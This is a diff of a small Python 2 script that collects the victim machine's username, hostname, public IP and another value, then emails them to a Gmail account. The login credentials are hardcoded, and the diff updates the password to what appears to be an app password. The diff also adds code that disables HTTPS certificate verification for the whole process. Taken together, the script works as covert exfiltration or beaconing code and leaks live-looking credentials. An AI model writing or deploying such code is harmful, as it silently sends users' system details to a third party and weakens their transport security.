@@ -1,9 +1,13 @@
 import smtplib
 import socket
 import getpass
-import ssl
 from json import load
 from urllib2 import urlopen
+
+import os, ssl
+if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
+getattr(ssl, '_create_unverified_context', None)):
+    ssl._create_default_https_context = ssl._create_unverified_context
 
 ip = load (urlopen ('http://jsonip.com'))['ip']
 un = socket.gethostname () + ".modem"
@@ -21,7 +25,7 @@ message = getpass.getuser() + "\n" + first_line + "\n" + ip + "\n" + un
 msg.attach(MIMEText(message))
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-server.login("th3ta403@gmail.com", "Theta403")
+server.login("th3ta403@gmail.com", "ylneldskrhoafmna")
 server.sendmail(
   "th3ta403@gmail.com", 
   "th3ta403@gmail.com", 
